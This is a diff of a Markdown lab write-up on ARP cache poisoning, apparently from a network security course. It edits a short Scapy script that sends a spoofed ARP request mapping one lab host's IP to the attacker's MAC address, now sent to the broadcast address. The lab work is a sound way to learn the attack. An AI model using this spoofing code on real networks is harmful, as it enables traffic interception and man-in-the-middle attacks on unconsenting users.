@@ -1,12 +1,3 @@
----
-hide:
-  #- navigation # 显示右
-  #- toc #显示左
-  - footer
-  - feedback
-# comments: true
----  
-
 # ARP Attack
 
 ## 任务 1：ARP 缓存中毒攻击
@@ -27,11 +18,11 @@ hide:
 from scapy.all import *
 
 A_IP = "10.9.0.5"
-A_MAC = "ea:9c:17:47:e2:9e"
 B_IP = "10.9.0.6"
 M_MAC = "8e:ff:11:30:f1:57"
+broadcast = "ff:ff:ff:ff:ff:ff"
 
-pkt = Ether(src = M_MAC, dst = A_MAC) / ARP(op = 1, psrc = B_IP, hwsrc = M_MAC, pdst = A_IP, hwdst = A_MAC)
+pkt = Ether(src = M_MAC, dst = broadcast) / ARP(op = 1, psrc = B_IP, hwsrc = M_MAC, pdst = A_IP)
 sendp(pkt)
 ```
 
